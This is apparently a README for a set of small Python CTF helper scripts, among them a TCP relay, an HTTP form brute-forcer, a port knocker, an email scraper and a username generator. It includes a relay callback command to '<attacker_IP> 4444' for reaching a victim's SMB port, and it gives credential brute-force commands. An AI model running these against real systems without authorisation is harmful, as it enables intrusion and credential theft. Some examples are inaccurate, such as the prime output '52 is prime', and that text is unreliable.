# python_widgets
A collection of small helper scripts I've used during CTF challenges; all scripts are made with the quick-and-dirty principle, but that doesn't mean they're not useful!

All scripts written for Python 3. More to follow in time.

## Requirements

All requirements have been rolled into one requirements file, to get up and running for all tools:

```
~$ python -m pip install -r requirements.txt
```

Then go!

## Installation

Scripts can simply be run from the command line; the interpreter is usually /usr/bin/env python3.

The toolset is designed to run on Linux machines, though there is no reason why Windows compatibility should be broken. As usual, any requests or issues welcome at [info@blackfell.net](mailto:info@blackfell.net).

'Installation' can be achieved in a hack-y manner in Linux by adding the directory to path:

### Bash

Installation from scratch:

```
~$ git clone https://github.com/Blackfell/python_widgets
~$ cd python_widgets
~$ python -m pip install -r requirements.txt
~$ echo "export PATH=$PATH:$(pwd)" >> ~/.bashrc
```

### ZSH

Installation from scratch:

```
~$ git clone https://github.com/Blackfell/python_widgets
~$ cd python_widgets
~$ python -m pip install -r requirements.txt
~$ echo "export PATH=$PATH:$(pwd)"  >> ~/.zshrc
```

### Temporary install - Most Other Shells

Amend path on the fly, path in shell will reset once the shell process terminates. In other words, this is a temporary install, maybe useful to try the tools out.

```
~$ git clone https://github.com/Blackfell/python_widgets
~$ cd python_widgets
~$ PATH=$PATH:$(pwd)
```

# Rot Hunter

This is the first tool I've published so far and is something I use when feeling too lazy to try different rot encodings during CTFs. This tool takes two files as command line arguments, one containing your ciphertext, one containing a dictionary of valid words; the tool will find the most likely rot key and allow you to parse all other options in decreasing order of confidence the solution is good. Usage:

```
~$ rothunter.py [wordlist_file] [ciphertext_file]
```

Where your wordlist is a file of words that are likely to exist in teh plaintext and the ciphertext is your encoded message stored in a simple text file.

I've inluded a couple of test files for your enjoyment in *resources/rot_hunter/*, including a nice open source english dictionary wordlist; check out the file header for more usage info and get started!

# TCP Relay

This tool is a (slightly) simpler version of a netcat relay, without netcat, trickery, magic etc. Just drop the relay on your target and start forwarding TCP ports.

You should compile your own binary for your systems if you can, but a copy is included in the repo for speediness.

```
usage: relay.py [-h] [-l LISTEN [LISTEN ...]] [-c CONNECT [CONNECT ...]] [-t] [-v]

optional arguments:
  -h, --help            show this help message and exit
  -l LISTEN [LISTEN ...], --listen LISTEN [LISTEN ...]
                        Listen on a given port. Format -l <port>
  -c CONNECT [CONNECT ...], --connect CONNECT [CONNECT ...]
                        Connect to a given host & port. Format : -c <host> <port>
  -t, --tee             Also print all traffic on Stdout.
  -v, --verbose         Print more stuff during execution.
```
It's like nc | nc with backpipes and nc -e nc.bat, but without the faff!

## Examples

To connect to and forward a firewalled port (say 445 in this example), listening for connections over a permitted port (5555), run:

```
C:\> relay.exe -c 127.0.0.1 445 -l 5555
```

And you'll be able to connect straight up to the victim port 5555 to get SMB access; similarly, if all inbound is filtered, you could run a call back relay. First, on your attacker:

```
attacker@attacker ~$ relay.py -l 4444 -l 9999 -v -t
```

This will set up a local relay to catch the callback and serve relay traffic to port 9999; the *-v* and *-t* tags make the tool run verbosely and tee all data to the console respectively. Now execute a callback relay from the victim:

```
C:\relay.exe -c 127.0.0.1 445 -c <attacker_IP> 4444
```

Now you'll be able to access SMB from your **attacker** machine, port 9999. Enjoy!

# HTTP form brute

This tool exists because I can never remember how to work THC hydra when guessing HTTP post forms. To help me remember the syntax, the capabilities of THC hydra have been imiated and broken out into individual command line switches.

```
usage: http-form-brute.py [-h] -u URL (-l LOGIN | -L LOGIN_LIST  -p PASSWORD | -P PASSWORD_LIST) [-t  THREADS]
                          [-pU USER_PARAM] [-pP PASS_PARAM] [-pE EXTRA_PARAM [EXTRA_PARAM ...]] [-c]
                          (-sM SUCCESS_MATCH | -sX SUCCESS_EXCLUDE)
```

## Usage

HTTP login forcer supports the following command line options:

```
optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Hostname or IP address to attack (e.g. http://site.com/login.php).
  -l LOGIN, --login LOGIN
                        Username to attack with.
  -L LOGIN_LIST, --login-list LOGIN_LIST
                        User list to attack with.
  -p PASSWORD, --password PASSWORD
                        Password to attack with.
  -P PASSWORD_LIST, --password-list PASSWORD_LIST
                        Password list to attack with.
  -t  THREADS, --threads THREADS
                        Number of attack threads (default - 25)
  -pU USER_PARAM, --user-param USER_PARAM
                        HTTP form parameter for username (without '&') default setting 'username'.
  -pP PASS_PARAM, --pass-param PASS_PARAM
                        HTTP form parameter for password (without '&') default setting 'password'.
  -pE EXTRA_PARAM [EXTRA_PARAM ...], --extra-param EXTRA_PARAM [EXTRA_PARAM ...]
                        Extra (non-brutable) form parameter (.e.g. '&login=Submit'
  -c, --cont            Continue brute-forcing once one valid cred has been found (Default False).'
  -sM SUCCESS_MATCH, --success-match SUCCESS_MATCH
                        String to match on successful login - if found - login successful (e.g. "Successful").
  -sX SUCCESS_EXCLUDE, --success-exclude SUCCESS_EXCLUDE
                        String to match on failed login - if not found, login successful (e.g. "not valid"this means ).
```

For a successful http form attack, a URL, user-parameter and password-parameter must all be provided; these can be found by inspecting the web form, or valid request and understanding how and where requests are submitted.

In order to validate whether a credential is good or not, either a success-match or success-exclude parameter must be provided. Success-match and Success-exclude strings will trigger a *valid credential* message whenever the string is present or absent in the response resepectively. Examples may be a success-match for *'login successful'* or a success-exclude for *'login failed'*.

Finally, a password (or password list) and username (or username list) must be provided.

Additional arguments are available to support limited web application intricacies; the key one being extra-params; these are any other post data parameters (along with their values) that are required by the web app. This may be something like *'&login=Submit'*.

## Examples

There is a test server available in the resources directory that can be started as follows:

```
~$ python3 resources/http-form-brute/test-http-form-server.py 8080
```

Note that the file is not executable by default. Using this server, you'll be able to test the script against a local server on port 8080. All examples are carried out against this script.

### Crack me if you can

Before you read further, why not try and get the tool to work against the test server?

The server doesn't do much, so there's no need to browse there, but it is expecting a POST request to /login.php (don't forget to specify a post number - default is 8080). Rquests made should have post data of the format *"pass=[password]&user=[username]"*, so the user variable is called **user**  and the password parameter is called **pass**; *[username]* and *[password]* are the post parameter variables, which the tool will iterate for you.

On an unsuccessful login, you'll receive a response with **'Login failed.'** in it, if the username is incorrect, the response will also have **'Bad username'** in it, if the password is incorrect (but username is correct), the response will still say login failed, but **'Bad password'** will also be included. If the login details are correct, the response will have **'Login successful!'** in it.

The valid username for the test server exists in the Matasploit **unix_users.txt** wordlist, which is packaged with Kali Linux under */usr/share/wordlists/metasploit/unix_users.txt*. The valid password exists in the **fasttrack.txt** wordlist (and *rockyou.txt* but some of us don't have all day), packaged with Kali Linux under */usr/share/wordlists/fasttrack.txt*.

Note that you're running Python against Python on one machine and there are inefficiencies that will slow down both the server and bruter processes (even though they use multiprocessing). It's advisable to lower the thread count to 2 or 3 using the *'-t'* flag during testing.

Give it a try!

### Worked Examples - Here be spoilers!

Running the test server on our localhost, there are various ways we can run the login bruter. All examples use the wordlist paths that are default locations in Kali Linux 2020, your wordlists may be nonexistent or elsewhere.

We know from the previous section that the url we need to guess against is the localhost, port 8080, at a path of *'/login.php'*, so our url parameter will be **"http://localhost:8080/login.php"**. We'll need to supply athis means  user parameter of **"user"** and a password parameter of **"pass"** no extra parameters are needed. We'll be using the recommended user and password lists from the previous section, with a thread count of three. Finally, we'll need a success criteria, which is where we have a few options...

Consider the following cases:

```
~$ http-form-brute.py -pU user -pP pass -L /usr/share/wordlists/metasploit/unix_users.txt -p anypassword -sX "Bad username" -u http://localhost:8080/login.php -t 3

~$ http-form-brute.py -pU user -pP pass -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/fasttrack.txt -sM "Login successful" -u http://localhost:8080/login.php -t 3
```
Carrying out the attack via the first means carries out a search for any responses that **don't include** the string *'Bad username'*, effectively searching for the valid username. The second way will permute all users and passwords, which will take longer; therefore, we'll be avoiding this. Note that as per the recommendation in the previous section, only three threads are used to avoid broken pipes etc. due to the server running on the same machine as the guessing threads.

Carrying out the user brute method, it should be apparent that the valid username is *'auditor'*; this can then be used to brute force the password:

```
~$ http-form-brute.py -pU user -pP pass -l auditor -p /usr/share/wordlists/fasttrack.txt -sX "Login failed." -t 3
```

This, in the case of the test site, is equivalent to:

```
~$ http-form-brute.py -pU user -pP pass -l auditor -p /usr/share/wordlists/fasttrack.txt -sM "Login successful" -t 3
```

# Prime Tester

This script accepts one command line argument - an integer. It will tell you if that argument is a prime number.

Usage:

```
~$ prime-test.py 53
[+] - Yes, 52 is prime!
```

Simple!

# Port Knocker

This tool knocks ports, either in a provided order, or by trying all permutations available (and testing a target port to see which works).

```
usage: knock.py [-h] -H HOST [-kT | -kS | -kU] [-b] -p KNOCK_PORTS [-t TARGET_PORT] [-d DELAY] [-v]
```

## Usage

Knock supports the following command line options:

```
optional arguments:
  -h, --help            show this help message and exit
  -H HOST, --host HOST  Hostname or IP address to knock against.
  -kT, --tcp-connect    Knock with a full TCP connect (default if not set).
  -kS, --syn            Knock with Syn packets by default.
  -kU, --udp            Knock with UDP packets by default.
  -b, --brute           Permute through knocking combinations until target port is open. REQUIRES specification of
                        --target-port.
  -p KNOCK_PORTS, --knock-ports KNOCK_PORTS
                        Ports to knock on, comma delimited.
  -t TARGET_PORT, --target-port TARGET_PORT
                        Port to check status of after knocking; REQUIRED if using --brute. Will default to knock
                        protocol, unless specified with colon delimiter - e.g. -t 80:TCP.
  -d DELAY, --delay DELAY
                        Time to wait between knocks in seconds (default 0).
  -v, --verbose         Show detailed knock information.
```

The host flag specifies your target and can be a hostname or IP address; delay will cause knock packets to be sent after the provided number of seconds.

Ports must be specified comma-delimited and more than one is required. The Knock protocol flags set the **default** protocol, but this can be overridden as follows:

```
~$ knock.py -kU -H localhost -p 53,9000,22:tcp,23:syn
```

This will knock ports *53* and *9000* on UDP, but port 22 will be knocked using tcp and 23 using a syn packet.

The *--brute* option permutes the provided ports (as opposed to knocking in order); this requires a test port (*-t*), which again, can be specified with a protocol override. If you don't care about a test port, just specify a junk one and ignore the warnings.

# Email Parser

This script takes a URL and returns a list of email addresses listed on that page. It is very simple, uses the requests libraries and regular expressions, so results on Javascript heavy pages will be limited.

An optional second argument will write the results out to a file.

Usage:

```
~$ email-parser.py "https://google.com" outfile.txt
```

Simple (again)!

# User Listify

This script takes a list of whitespace separated first and last names and produces a list of potential user names based off common username conventions. The script will carry out four main iterations:
  - First name and last name concatenated.
  - First initial and last name.
  - First name and last initial.
  - First three letters of first and last names.

In all cases, concatenations are also carried out with standard delimeters, a dash and a space.

Usage:

```
~$ user_listify.py [-h] [-c] [-d DELIMS] -i INPUT_FILE [-o OUT_FILE] [-a APPEND_NUMBERS]
```

The case flag *-c* will also iterate basic capitalisation options (the first characters of each name respectively), so you'll see username userName Username and UserName. The default delimeters can be overriden with *-d*, as follows:

```
~$ user_listify.py -d "'','.','-','_','--'" -i INPUT_FILE
```

Finally, the append numbers options will also append numbers up to the specified integer to all user names.

# Discord Notify

This script takes a command line and calls it via the Python Subprocess module, sending the output and optional Stdout/Stderr updates to Discord. Discord configuration is managed via a YAML configuration file, which defines your webhooks and enables you to send output to channels by specifying a friendly name. If you want to run an nmap scan against all ports on your loopback, with updates every 120 seconds, you might call:

```
~$ discordnotify.py -b 120 -c "nmap -Pn -p- localhost"
```

Please note your mileage will vary heavily with verbose and fancy terminal tools (e.g. progress bars), so running in silent of less-verbose modes is a good idea:


```
~$ discordnotify.py -b 240 -c "ffuf -s -w ./wordlkist.txt -u https://target.local/FUZZ"
```

You may also specify a webhook URL manually on the command line, or speficy a file to attch after the job completes. The image attachment feature is in work and doesn't currently function correctly.

In summary - It ain't pretty, but it works.

# I want Moar

This project is in ongoing development as I work on various challenges; its posted on GitHub to allow people to review and feedback. If you have a suggestion, feature, complaint, funny story, write to: info@blackfell.net.
